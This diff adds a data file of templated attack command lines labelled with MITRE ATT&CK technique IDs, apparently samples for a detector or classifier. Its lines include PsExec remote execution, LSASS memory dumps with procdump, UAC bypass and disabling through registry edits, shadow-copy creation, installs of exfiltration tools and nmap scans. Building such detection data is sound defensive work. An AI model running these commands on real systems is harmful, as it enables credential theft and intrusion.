@@ -1,0 +1,363 @@
+# T1133 External Remote Services
+T1133 Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+T1133 cmd /c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+T1133 powershell -c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+T1133 Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+T1133 cmd /c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+T1133 powershell -c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+T1133 Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+T1133 cmd /c Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+T1133 powershell -c Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+T1133 Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+T1133 cmd /c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+T1133 powershell -c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+T1133 Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+T1133 cmd /c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+T1133 powershell -c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+T1133 Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+T1133 cmd /c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+T1133 powershell -c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+T1133 Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+T1133 cmd /c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+T1133 powershell -c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+T1133 Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+T1133 cmd /c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+T1133 powershell -c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+T1133 Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+T1133 cmd /c Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+T1133 powershell -c Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+T1133 Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+T1133 cmd /c Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+T1133 powershell -c Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+T1133 Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 cmd /c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 powershell -c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 cmd /c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 powershell -c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 cmd /c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 powershell -c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 cmd /c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 powershell -c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 cmd /c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 powershell -c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 cmd /c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 powershell -c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 cmd /c Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 powershell -c Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 cmd /c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 powershell -c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 cmd /c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 powershell -c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 cmd /c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 powershell -c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 cmd /c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 powershell -c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 cmd /c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 powershell -c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+T1133 cmd /c Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+T1133 powershell -c Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+T1133 Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+T1133 cmd /c Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+T1133 powershell -c Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+
+# T1072 Software Deployment Tools
+T1072 choco install -y 7zip
+T1072 cmd /c choco install -y 7zip
+T1072 powershell -c choco install -y 7zip
+T1072 choco install 7zip
+T1072 cmd /c choco install 7zip
+T1072 powershell -c choco install 7zip
+T1072 choco install -f 7zip
+T1072 cmd /c choco install -f 7zip
+T1072 powershell -c choco install -f 7zip
+T1072 choco install -y putty
+T1072 cmd /c choco install -y putty
+T1072 powershell -c choco install -y putty
+T1072 choco install putty
+T1072 cmd /c choco install putty
+T1072 powershell -c choco install putty
+T1072 choco install -f putty
+T1072 cmd /c choco install -f putty
+T1072 powershell -c choco install -f putty
+T1072 choco install rclone
+T1072 cmd /c choco install rclone
+T1072 powershell -c choco install rclone
+T1072 choco install -y rclone
+T1072 cmd /c choco install -y rclone
+T1072 powershell -c choco install -y rclone
+T1072 choco install -f rclone
+T1072 cmd /c choco install -f rclone
+T1072 powershell -c choco install -f rclone
+T1072 choco install ngrok
+T1072 cmd /c choco install ngrok
+T1072 powershell -c choco install ngrok
+T1072 choco install -y ngrok
+T1072 cmd /c choco install -y ngrok
+T1072 powershell -c choco install -y ngrok
+T1072 choco install -f ngrok
+T1072 cmd /c choco install -f ngrok
+T1072 powershell -c choco install -f ngrok
+T1072 choco install psexec
+T1072 cmd /c choco install psexec
+T1072 powershell -c choco install psexec
+T1072 choco install -y psexec
+T1072 cmd /c choco install -y psexec
+T1072 powershell -c choco install -y psexec
+T1072 choco install -f psexec
+T1072 cmd /c choco install -f psexec
+T1072 powershell -c choco install -f psexec
+T1072 choco install procdump
+T1072 cmd /c choco install procdump
+T1072 powershell -c choco install procdump
+T1072 choco install -y procdump
+T1072 cmd /c choco install -y procdump
+T1072 powershell -c choco install -y procdump
+T1072 choco install -f procdump
+T1072 cmd /c choco install -f procdump
+T1072 powershell -c choco install -f procdump
+T1072 choco install Megasync
+T1072 cmd /c choco install Megasync
+T1072 powershell -c choco install Megasync
+T1072 choco install -y Megasync
+T1072 cmd /c choco install -y Megasync
+T1072 powershell -c choco install -y Megasync
+T1072 choco install -f Megasync
+T1072 cmd /c choco install -f Megasync
+T1072 powershell -c choco install -f Megasync
+T1072 choco install winscp
+T1072 cmd /c choco install winscp
+T1072 powershell -c choco install winscp
+T1072 choco install -y winscp
+T1072 cmd /c choco install -y winscp
+T1072 powershell -c choco install -y winscp
+T1072 choco install -f winscp
+T1072 cmd /c choco install -f winscp
+T1072 powershell -c choco install -f winscp
+
+# T1547 Boot or Logon Autostart Execution
+T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
+T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
+T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
+T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ 
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
+T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
+T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ
+T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
+T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
+T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
+T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
+T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
+T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f
+T1547 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+T1547 cmd /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+T1547 powershell -c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+T1547 reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+T1547 cmd /c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+T1547 powershell -c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
+T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
+T1547 reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
+T1547 cmd /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
+T1547 powershell -c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
+T1547 reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
+T1547 cmd /c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
+T1547 powershell -c reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
+T1547 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
+T1547 cmd /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
+T1547 powershell -c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
+T1547 reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
+T1547 cmd /c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
+T1547 powershell -c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
+T1547 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
+T1547 cmd /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
+T1547 powershell -c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
+T1547 reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
+T1547 cmd /c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
+T1547 powershell -c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
+T1547 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
+T1547 cmd /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
+T1547 powershell -c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
+T1547 reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
+T1547 cmd /c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
+T1547 powershell -c reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
+
+# T1003 OS Credential Dumping
+T1003 procdump -ma lsass.exe lsassdump.dmp
+T1003 cmd /c procdump -ma lsass.exe lsassdump.dmp
+T1003 powershell -c procdump -ma lsass.exe lsassdump.dmp
+T1003 procdump.exe -ma lsass.exe lsassdump.dmp
+T1003 cmd /c procdump.exe -ma lsass.exe lsassdump.dmp
+T1003 powershell -c procdump.exe -ma lsass.exe lsassdump.dmp
+T1003 procdump -accepteula -ma lsass.exe lsassdump.dmp
+T1003 cmd /c procdump -accepteula -ma lsass.exe lsassdump.dmp
+T1003 powershell -c procdump -accepteula -ma lsass.exe lsassdump.dmp
+T1003 procdump.exe -accepteula -ma lsass.exe lsassdump.dmp
+T1003 cmd /c procdump.exe -accepteula -ma lsass.exe lsassdump.dmp
+T1003 powershell -c procdump.exe -accepteula -ma lsass.exe lsassdump.dmp
+T1003 procdump -mm lsass.exe lsassdump.dmp
+T1003 cmd /c procdump -mm lsass.exe lsassdump.dmp
+T1003 powershell -c procdump -mm lsass.exe lsassdump.dmp
+T1003 procdump -accepteula -mm lsass.exe lsassdump.dmp
+T1003 cmd /c procdump -accepteula -mm lsass.exe lsassdump.dmp
+T1003 powershell -c procdump -accepteula -mm lsass.exe lsassdump.dmp
+T1003 procdump.exe -mm lsass.exe lsassdump.dmp
+T1003 cmd /c procdump.exe -mm lsass.exe lsassdump.dmp
+T1003 powershell -c procdump.exe -mm lsass.exe lsassdump.dmp
+T1003 procdump.exe -accepteula -mm lsass.exe lsassdump.dmp
+T1003 cmd /c procdump.exe -accepteula -mm lsass.exe lsassdump.dmp
+T1003 powershell -c procdump.exe -accepteula -mm lsass.exe lsassdump.dmp
+T1003 procdump -ma lsass lsassdump.dmp
+T1003 cmd /c procdump -ma lsass lsassdump.dmp
+T1003 powershell -c procdump -ma lsass lsassdump.dmp
+T1003 procdump.exe -ma lsass lsassdump.dmp
+T1003 cmd /c procdump.exe -ma lsass lsassdump.dmp
+T1003 powershell -c procdump.exe -ma lsass lsassdump.dmp
+T1003 procdump -accepteula -ma lsass lsassdump.dmp
+T1003 cmd /c procdump -accepteula -ma lsass lsassdump.dmp
+T1003 powershell -c procdump -accepteula -ma lsass lsassdump.dmp
+T1003 procdump.exe -accepteula -ma lsass lsassdump.dmp
+T1003 cmd /c procdump.exe -accepteula -ma lsass lsassdump.dmp
+T1003 powershell -c procdump.exe -accepteula -ma lsass lsassdump.dmp
+T1003 procdump -mm lsass lsassdump.dmp
+T1003 cmd /c procdump -mm lsass lsassdump.dmp
+T1003 powershell -c procdump -mm lsass lsassdump.dmp
+T1003 procdump -accepteula -mm lsass lsassdump.dmp
+T1003 cmd /c procdump -accepteula -mm lsass lsassdump.dmp
+T1003 powershell -c procdump -accepteula -mm lsass lsassdump.dmp
+T1003 procdump.exe -mm lsass lsassdump.dmp
+T1003 cmd /c procdump.exe -mm lsass lsassdump.dmp
+T1003 powershell -c procdump.exe -mm lsass lsassdump.dmp
+T1003 procdump.exe -accepteula -mm lsass lsassdump.dmp
+T1003 cmd /c procdump.exe -accepteula -mm lsass lsassdump.dmp
+T1003 powershell -c procdump.exe -accepteula -mm lsass lsassdump.dmp
+T1003 vssadmin create shadow /for=C:
+T1003 cmd /c vssadmin create shadow /for=C:
+T1003 powershell -c vssadmin create shadow /for=C:
+T1003 vssadmin.exe create shadow /for=C:
+T1003 cmd /c vssadmin.exe create shadow /for=C:
+T1003 powershell -c vssadmin.exe create shadow /for=C:
+T1003 wmic shadowcopy call create Volume=C:
+T1003 cmd /c wmic shadowcopy call create Volume=C:
+T1003 powershell -c wmic shadowcopy call create Volume=C:
+T1003 wmic.exe shadowcopy call create Volume=C:
+T1003 cmd /c wmic.exe shadowcopy call create Volume=C:
+T1003 powershell -c wmic.exe shadowcopy call create Volume=C:
+T1003 wmic /node:${ip_address} shadowcopy call create Volume=C:
+T1003 cmd /c wmic /node:${ip_address} shadowcopy call create Volume=C:
+T1003 powershell -c wmic /node:${ip_address} shadowcopy call create Volume=C:
+T1003 wmic.exe /node:${ip_address} shadowcopy call create Volume=C:
+T1003 cmd /c wmic.exe /node:${ip_address} shadowcopy call create Volume=C:
+T1003 powershell -c wmic.exe /node:${ip_address} shadowcopy call create Volume=C:
+
+# T1046 Network Service Discovery
+T1046 nmap ${ip_address}
+T1046 nmap ${ip_address} 2> /dev/null
+T1046 nmap ${ip_address} 2> &1
+T1046 nmap ${ip_address} 2> error.log
+T1046 nmap -T5 ${ip_address}
+T1046 nmap -T5 ${ip_address} 2> /dev/null
+T1046 nmap -T5 ${ip_address} 2> &1
+T1046 nmap -T5 ${ip_address} 2> error.log
+T1046 nmap -sP ${ip_address}
+T1046 nmap -sP ${ip_address} 2> /dev/null
+T1046 nmap -sP ${ip_address} 2> &1
+T1046 nmap -sP ${ip_address} 2> error.log
+T1046 nmap -v ${ip_address}
+T1046 nmap -v ${ip_address} 2> /dev/null
+T1046 nmap -v ${ip_address} 2> &1
+T1046 nmap -v ${ip_address} 2> error.log
+T1046 nmap -F ${ip_address}
+T1046 nmap -F ${ip_address} 2> /dev/null
+T1046 nmap -F ${ip_address} 2> &1
+T1046 nmap -F ${ip_address} 2> error.log
+T1046 nmap -sC ${ip_address}
+T1046 nmap -sC ${ip_address} 2> /dev/null
+T1046 nmap -sC ${ip_address} 2> &1
+T1046 nmap -sC ${ip_address} 2> error.log
+T1046 nmap -v -A ${ip_address}
+T1046 nmap -v -A ${ip_address} 2> /dev/null
+T1046 nmap -v -A ${ip_address} 2> &1
+T1046 nmap -v -A ${ip_address} 2> error.log
+T1046 nmap -A ${ip_address}
+T1046 nmap -A ${ip_address} 2> /dev/null
+T1046 nmap -A ${ip_address} 2> &1
+T1046 nmap -A ${ip_address} 2> error.log
+T1046 nmap --open ${ip_address}
+T1046 nmap --open ${ip_address} 2> /dev/null
+T1046 nmap --open ${ip_address} 2> &1
+T1046 nmap --open ${ip_address} 2> error.log
+T1046 nmap -PN ${ip_address}
+T1046 nmap -PN ${ip_address} 2> /dev/null
+T1046 nmap -PN ${ip_address} 2> &1
+T1046 nmap -PN ${ip_address} 2> error.log
+T1046 nmap -sV ${ip_address}
+T1046 nmap -sV ${ip_address} 2> /dev/null
+T1046 nmap -sV ${ip_address} 2> &1
+T1046 nmap -sV ${ip_address} 2> error.log
+T1046 nmap -p- ${ip_address}
+T1046 nmap -p- ${ip_address} 2> /dev/null
+T1046 nmap -p- ${ip_address} 2> &1
+T1046 nmap -p- ${ip_address} 2> error.log
+T1046 nmap -p- -sC ${ip_address}
+T1046 nmap -p- -sC ${ip_address} 2> /dev/null
+T1046 nmap -p- -sC ${ip_address} 2> &1
+T1046 nmap -p- -sC ${ip_address} 2> error.log
+T1046 nmap -p- -sC -sV ${ip_address}
+T1046 nmap -p- -sC -sV ${ip_address} 2> /dev/null
+T1046 nmap -p- -sC -sV ${ip_address} 2> &1
+T1046 nmap -p- -sC -sV ${ip_address} 2> error.log
+T1046 nmap -p- -sC -sV -O ${ip_address}
+T1046 nmap -p- -sC -sV -O ${ip_address} 2> /dev/null
+T1046 nmap -p- -sC -sV -O ${ip_address} 2> &1
+T1046 nmap -p- -sC -sV -O ${ip_address} 2> error.log
+T1046 nmap -p- -sC -sV -O -A ${ip_address}
+T1046 nmap -p- -sC -sV -O -A ${ip_address} 2> /dev/null
+T1046 nmap -p- -sC -sV -O -A ${ip_address} 2> &1
+T1046 nmap -p- -sC -sV -O -A ${ip_address} 2> error.log
+T1046 nmap -p- -sV -O ${ip_address}
+T1046 nmap -p- -sV -O ${ip_address} 2> /dev/null
+T1046 nmap -p- -sV -O ${ip_address} 2> &1
+T1046 nmap -p- -sV -O ${ip_address} 2> error.log
+T1046 nmap -p- -sC -O -A ${ip_address}
+T1046 nmap -p- -sC -O -A ${ip_address} 2> /dev/null
+T1046 nmap -p- -sC -O -A ${ip_address} 2> &1
+T1046 nmap -p- -sC -O -A ${ip_address} 2> error.log
